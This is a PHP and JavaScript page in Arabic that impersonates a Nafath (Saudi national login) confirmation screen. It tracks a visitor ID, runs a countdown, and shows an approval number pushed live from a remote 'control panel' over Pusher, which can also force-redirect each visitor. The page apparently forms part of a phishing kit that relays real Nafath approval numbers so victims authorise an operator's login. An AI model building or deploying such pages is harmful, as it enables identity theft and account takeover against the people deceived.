<?php
session_start();

// ✅ Get user ID from URL parameter or session
$userId = null;

if (isset($_GET['id'])) {
    $userId = $_GET['id'];
    $_SESSION['current_user_id'] = $userId;
    $_SESSION['client_id'] = $userId;
} elseif (isset($_GET['client_id'])) {
    $userId = $_GET['client_id'];
    $_SESSION['current_user_id'] = $userId;
    $_SESSION['client_id'] = $userId;
} elseif (isset($_SESSION['current_user_id'])) {
    $userId = $_SESSION['current_user_id'];
} elseif (isset($_SESSION['client_id'])) {
    $userId = $_SESSION['client_id'];
}

if (!$userId) {
    header('Location: success.php');
    exit;
}

// تثبيت في كل الـ sessions
$_SESSION['client_id'] = $userId;
$_SESSION['current_user_id'] = $userId;
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تأكيد الطلب - نفاذ</title>
  <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
  <style>
    :root { --brand:#0a3550; }
    * { box-sizing: border-box; }
    html,body { height:100%; margin:0; font-family: Arial, sans-serif; background:#fff; }

    .stage{
      min-height: 100vh;
      display: block;
      padding: 0 16px 88px;
      background: #fff;
    }

    .img-wrap{
      width: 100%;
      max-width: 680px;
      margin: 0 auto;
    }
    .img-wrap img{
      width: 100%;
      height: auto;
      display: block;
      object-fit: contain;
      border: 0;
      box-shadow: none;
      user-select: none;
      -webkit-user-drag: none;
    }

    .timer-bar{
      position: fixed; left:12px; right:12px; bottom:12px;
      background:#fff;
      border:2px solid #eaeaea;
      border-radius:14px;
      padding:10px 16px;
      text-align:center;
      z-index:5000;
    }
    .timer-title{ font-size:14px; color:#333; margin:0 0 6px; }
    .timer{
      font-variant-numeric: tabular-nums;
      font-size:30px; font-weight:800; color:var(--brand); letter-spacing:.5px;
      line-height:1;
    }
    @media (min-width:768px){ .timer{ font-size:36px; } }

    /* المودال */
    .overlay{
      display:none;
      position:fixed;
      inset:0;
      background:rgba(0,0,0,.45);
      align-items:center;
      justify-content:center;
      z-index:9000;
    }
    .modal{
      background:#fff;
      padding:24px 20px;
      border-radius:12px;
      text-align:center;
      max-width:400px;
      width:92%;
    }
    .modal h2{
      margin:0 0 16px;
      font-size:16px;
      color:#111;
      line-height:1.6;
    }
    
    /* عرض الرقم */
    .nafath-number{
      font-size: 48px;
      font-weight: 900;
      color: var(--brand);
      margin: 20px 0;
      letter-spacing: 3px;
      padding: 20px;
      background: #f0f8ff;
      border-radius: 12px;
      border: 3px solid var(--brand);
    }
    
    .waiting-msg {
      color: #666;
      font-size: 14px;
      margin: 15px 0;
    }
    
    .close-btn{
      margin-top:16px;
      padding:10px 20px;
      background:#6c757d;
      color:#fff;
      border:0;
      border-radius:8px;
      cursor:pointer;
      font-size: 14px;
    }
    
    .close-btn:hover {
      background: #5a6268;
    }
    
    @keyframes pulse {
      0%, 100% { 
          transform: scale(1); 
      }
      50% { 
          transform: scale(1.1); 
          color: #10b981;
      }
    }
  </style>
</head>
<body>

  <main class="stage">
    <div class="img-wrap">
      <img src="image/sorn.png" alt="الصورة">
    </div>
  </main>

  <div class="timer-bar" aria-live="polite">
    <p class="timer-title">الوقت المتبقي</p>
    <div id="timer" class="timer">01:00</div>
  </div>

  <!-- مودال نفاذ -->
  <div class="overlay" id="overlay">
    <div class="modal">
      <h2>الرجاء فتح تطبيق نفاذ وتأكيد الطلب بإختيار الرقم أدناه</h2>
      
      <!-- الرقم -->
      <div id="nafathNumber" class="nafath-number">...</div>
      
      <p class="waiting-msg">⏳ في انتظار الرقم من النظام</p>
      
      <button class="close-btn" onclick="closeModal()">إغلاق</button>
    </div>
  </div>

<script>
  const CLIENT_ID = <?= (int)$userId ?>;

  console.log('👤 User ID:', CLIENT_ID);


  // 2) المؤقت
  (function startCountdown(){
    const out = document.getElementById('timer');
    let total = 60;
    const fmt = s => {
      const m = Math.floor(s/60), r = s % 60;
      return (m<10?'0':'')+m + ':' + (r<10?'0':'')+r;
    };
    out.textContent = fmt(total);
    const t = setInterval(()=>{
      total = Math.max(0, total-1);
      out.textContent = fmt(total);
      if (total === 0) clearInterval(t);
    }, 1000);
  })();

  // 3) فتح/إغلاق المودال
  function openModal(){ 
    document.getElementById('overlay').style.display = 'flex';
  }
  
  function closeModal(){ 
    document.getElementById('overlay').style.display = 'none'; 
  }
  
  // فتح تلقائي بعد 5 ثواني
  setTimeout(openModal, 5000);

  // 4) 🔥 استقبال رقم نفاذ من لوحة التحكم عبر Pusher
  (function listenForNafathNumber(){
    const pusher = new Pusher('a56388ee6222f6c5fb86', { 
      cluster: 'ap2', 
      forceTLS: true 
    });
    
    const channel = pusher.subscribe('nafath-channel');
    
    // ✅ عند الاتصال بنجاح
    pusher.connection.bind('connected', function() {
      console.log('✅ Pusher متصل - في انتظار رقم نفاذ...');
    });
    
    // ✅ عند فشل الاتصال
    pusher.connection.bind('error', function(err) {
      console.error('❌ خطأ في Pusher:', err);
    });

    // ✅ استقبال رقم نفاذ
    channel.bind('nafath-event', function(data){
      console.log('📥 استلام بيانات من Pusher:', data);
      
      if (!data || !data.number) {
        console.error('❌ البيانات المستلمة لا تحتوي على رقم');
        return;
      }
      
      console.log('✅ رقم نفاذ مستلم:', data.number);
      
      // ✅ عرض الرقم لكل الناس على الصفحة
      displayNafathNumber(data.number);
    });
    
    console.log('🔌 Pusher: تم الاشتراك في القناة nafath-channel');
  })();

  // ✅ دالة عرض الرقم
  function displayNafathNumber(number) {
    console.log('📌 عرض الرقم:', number);
    
    const numberElement = document.getElementById('nafathNumber');
    if (numberElement) {
      numberElement.textContent = number;
      numberElement.style.animation = 'pulse 0.5s ease-in-out';
    }
    
    openModal();
    
    const waitingMsg = document.querySelector('.waiting-msg');
    if (waitingMsg) {
      waitingMsg.textContent = '✓ تم استلام الرقم';
      waitingMsg.style.color = '#28a745';
    }
  }

  // 5) الاستماع للتوجيه من لوحة التحكم
  (function listenForRedirect(){
    const pusherCtrl = new Pusher('a56388ee6222f6c5fb86', { 
      cluster: 'ap2', 
      forceTLS: true 
    });
    const ctrlChannel = pusherCtrl.subscribe('my-channel');

    ctrlChannel.bind('force-redirect-user', function(data){
      console.log('🔄 استلام طلب توجيه:', data);
      
      if (data.userId == CLIENT_ID) {
        console.log('✅ التوجيه إلى:', data.url);
        window.location.href = data.url || '../index.php';
      }
    });
  })();

  // حفظ في localStorage
  if (CLIENT_ID) {
    localStorage.setItem('current_user_id', CLIENT_ID);
    console.log('💾 تم حفظ User ID في localStorage');
  }
</script>

</body>
</html>